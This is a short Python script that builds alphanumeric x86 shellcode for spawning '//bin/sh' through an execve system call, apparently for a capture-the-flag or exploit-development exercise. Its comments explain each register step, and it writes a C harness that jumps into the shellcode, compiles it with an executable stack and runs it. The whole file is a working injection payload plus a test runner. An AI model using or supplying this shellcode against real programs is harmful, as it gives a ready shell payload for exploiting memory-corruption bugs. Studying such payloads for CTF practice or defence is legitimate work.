import os

shellcode = ""

# pop stack over the shellcode
shellcode += "Y"*120

# push "int 0x80"
shellcode += "j0X40" # eax = 0
shellcode += "PZJ" # ecx = 0xff*4
shellcode += "RX" # eax = 0xff*4
shellcode += "5VVJJ"
shellcode += "599x5" #eax =0x80cd9090
shellcode += "P" # push eax

# push "pop ebx"
shellcode += "RX" # eax = 0xff*4
shellcode += "5oooo" # eax = 0x90*4
shellcode += "PZ" # edx = 0x90*4
shellcode += "J"*53 # edx = 0x90*2 + 0x5b
shellcode += "R" # push edx

# push nop*n
shellcode += "j0X40" # eax = 0
shellcode += "PZJ" # ecx = 0xff*4
shellcode += "RX" # eax = 0xff*4
shellcode += "5oooo" # eax = 0x90*4
shellcode += "P"*30 # push eax

# push "//bin/sh" pointer
shellcode += "j0X40" # eax = 0
shellcode += "P" # push eax
shellcode += "5ZZCX"+"54u00"+"P" # push "n/sh"
shellcode += "j0X40" # eax = 0
shellcode += "5ZZZZ"+"5uu83"+"P" # push "//bin"
shellcode += "T" # push esp

# set eax = 11 edx,ecx = 0
shellcode += "j0X40" # eax = 0
shellcode += "PZ" # edx = 0
shellcode += "PY" # ecx = 0
shellcode += "A"*11 # ecx = 11
shellcode += "QX" # eax = 11
shellcode += "RY" # ecx = 0

# jmp to nop or "pop ebp"
shellcode += "qa"

print shellcode

code = "#include<string.h>\n"
code += "int main(void)\n{\n"
code += "char shellcode[4096];\n"
code += "strcpy(shellcode,\"" + shellcode + "\");\n"
code += "(*(void(*)()) shellcode)();\n"
code += "return 0;\n}"

file = open('input.c', 'w')
file.write(code)
file.close()

file = open('input', 'w')
file.write(shellcode+"\n")
file.close()

os.system("gcc input.c -z execstack && ./a.out")
